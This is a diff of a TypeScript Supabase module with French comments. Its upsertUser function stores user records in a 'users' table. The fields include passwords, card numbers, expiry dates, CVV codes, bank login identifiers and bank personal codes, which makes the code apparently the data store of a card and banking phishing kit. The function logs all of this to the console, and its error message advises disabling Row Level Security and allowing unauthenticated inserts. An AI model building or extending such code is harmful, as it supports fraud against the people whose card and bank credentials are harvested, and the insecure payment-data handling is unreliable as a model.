@@ -1,4 +1,3 @@
-
 import { createClient } from '@supabase/supabase-js';
 
 // Configuration Supabase avec les clés réelles
@@ -14,17 +13,17 @@ export interface UserData {
   password?: string;
   nom?: string;
   prenom?: string;
-  datenaissance?: string; // Mise à jour du nom du champ
+  datenaissance?: string;
   adresse?: string;
-  codepostal?: string; // Mise à jour du nom du champ
+  codepostal?: string;
   ville?: string;
   telephone?: string;
-  numerocarte?: string; // Mise à jour du nom du champ
-  dateexpiration?: string; // Mise à jour du nom du champ
+  numerocarte?: string;
+  dateexpiration?: string;
   cryptogramme?: string;
-  typebanque?: string; // Mise à jour du nom du champ
-  identifiantbanque?: string; // Mise à jour du nom du champ
-  codepersonnel?: string; // Mise à jour du nom du champ
+  typebanque?: string;
+  identifiantbanque?: string;
+  codepersonnel?: string;
   montant?: string;
   code?: string;
   
@@ -37,6 +36,51 @@ export interface UserData {
   identifiantBancaire?: string;
   codePersonnel?: string;
 }
+
+// Function to upsert user with more detailed logging
+export const upsertUser = async (userData: UserData) => {
+  try {
+    console.log('Tentative d\'upsert avec les données:', JSON.stringify(userData, null, 2));
+    
+    // Vérifions si l'email est présent
+    if (!userData.email) {
+      console.error('Erreur: email manquant dans les données');
+      throw new Error('Email manquant dans les données utilisateur');
+    }
+    
+    const { data, error } = await supabase
+      .from('users')
+      .upsert(userData, { 
+        onConflict: 'email',
+        ignoreDuplicates: false
+      })
+      .select();
+
+    if (error) {
+      console.error('Erreur Supabase lors de l\'upsert:', error);
+      console.log('Code d\'erreur:', error.code);
+      console.log('Message d\'erreur:', error.message);
+      console.log('Détails de l\'erreur:', error.details);
+      
+      // Vérifier si l'erreur est liée à RLS
+      if (error.code === '42501' || error.message.includes('row-level security')) {
+        throw { 
+          message: 'Problème de sécurité: Row Level Security (RLS) empêche les modifications',
+          isRlsError: true,
+          originalError: error,
+          solution: 'Désactivez RLS dans Supabase ou configurez une politique permettant les insertions sans authentification'
+        };
+      }
+      throw error;
+    }
+
+    console.log('Upsert réussi:', data);
+    return data;
+  } catch (error: any) {
+    console.error('Erreur complète lors de l\'upsert:', error);
+    throw error;
+  }
+};
 
 // Function to verify if the users table exists and RLS status
 export const verifyUsersTableExists = async (): Promise<{exists: boolean, hasRls: boolean}> => {
@@ -93,45 +137,6 @@ export const getUserByEmail = async (email: string) => {
     return data;
   } catch (error: any) {
     console.error('Error fetching user:', error);
-    throw error;
-  }
-};
-
-// Function to insert or update user
-export const upsertUser = async (userData: UserData) => {
-  try {
-    console.log('Attempting to upsert user with data:', userData);
-    
-    const { data, error } = await supabase
-      .from('users')
-      .upsert(userData, { 
-        onConflict: 'email',
-        ignoreDuplicates: false
-      })
-      .select();
-
-    if (error) {
-      console.error('Error upserting user:', error);
-      // Affiche des informations détaillées sur l'erreur pour le débogage
-      console.log('Code d\'erreur:', error.code);
-      console.log('Message d\'erreur:', error.message);
-      console.log('Détails de l\'erreur:', error.details);
-      
-      // Check if error is related to RLS
-      if (error.code === '42501' || error.message.includes('row-level security')) {
-        throw { 
-          message: 'Problème de sécurité: Row Level Security (RLS) empêche les modifications',
-          isRlsError: true,
-          originalError: error,
-          solution: 'Désactivez RLS dans Supabase ou configurez une politique permettant les insertions sans authentification'
-        };
-      }
-      throw error;
-    }
-
-    return data;
-  } catch (error: any) {
-    console.error('Error upserting user:', error);
     throw error;
   }
 };
